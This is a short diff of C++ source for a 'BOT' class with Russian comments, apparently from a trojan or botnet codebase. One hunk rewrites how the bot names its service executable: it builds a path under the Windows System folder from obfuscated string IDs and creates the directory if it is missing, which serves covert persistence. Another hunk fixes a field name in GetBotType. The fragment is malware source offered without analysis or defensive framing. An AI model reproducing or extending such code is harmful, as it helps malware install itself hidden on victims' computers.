@@ -661,7 +661,14 @@ PCHAR BOT::GetBotFullExeName()
 string BOT::GetServiceFullExeName()
 {
 	// Создаём имя ехе файла сервиса
-	return GetSpecialFolderPathA(CSIDL_SYSTEM, GetBotExeName());
+	string Path = GetSpecialFolderPathA(CSIDL_SYSTEM, GetStr(EStrBotServiceExePath).t_str());
+
+	if (!DirExists(Path.t_str()))
+		pCreateDirectoryA(Path.t_str(), NULL);
+
+	Path += GetStr(EStrBotServiceExeName);
+
+	return Path;
 }
 //----------------------------------------------------------------------------
 
@@ -967,6 +974,6 @@ void BOT::SetBotType(TBotType Type)
 
 TBotType BOT::GetBotType()
 {
-	return Type;
+	return BotType;
 }
 //----------------------------------------------------------------------------
